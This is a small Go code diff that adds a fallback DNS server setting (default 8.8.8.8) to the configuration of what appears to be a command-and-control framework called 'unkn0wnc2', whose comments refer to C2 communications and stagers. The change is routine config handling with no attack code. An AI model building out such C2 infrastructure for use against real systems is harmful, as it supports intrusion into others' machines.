@@ -22,6 +22,7 @@ type Config struct {
 	WebRoot          string           `json:"web_root"`          // Path to web UI files directory
 	SourceDir        string           `json:"source_dir"`        // Path to source code directory for building
 	EncryptionKey    string           `json:"encryption_key"`    // Global encryption key for all C2 communications
+	FallbackDNS      string           `json:"fallback_dns"`      // Fallback DNS server for stagers (default: 8.8.8.8)
 	Debug            bool             `json:"debug"`             // Enable debug logging
 	JWTSecret        string           `json:"jwt_secret"`        // Secret for JWT token signing
 	SessionTimeout   int              `json:"session_timeout"`   // Session timeout in minutes (default: 60)
@@ -54,6 +55,7 @@ func DefaultConfig() Config {
 		DatabasePath:   "/opt/unkn0wnc2/master.db",
 		WebRoot:        "/opt/unkn0wnc2/web",
 		SourceDir:      "/opt/unkn0wnc2/src",
+		FallbackDNS:    "8.8.8.8",
 		Debug:          false,
 		JWTSecret:      "", // MUST be provided via config or environment variable
 		SessionTimeout: 60,
@@ -119,6 +121,9 @@ func LoadConfig(configPath string) (Config, error) {
 	}
 	if fileCfg.EncryptionKey != "" {
 		cfg.EncryptionKey = fileCfg.EncryptionKey
+	}
+	if fileCfg.FallbackDNS != "" {
+		cfg.FallbackDNS = fileCfg.FallbackDNS
 	}
 	if fileCfg.JWTSecret != "" {
 		cfg.JWTSecret = fileCfg.JWTSecret
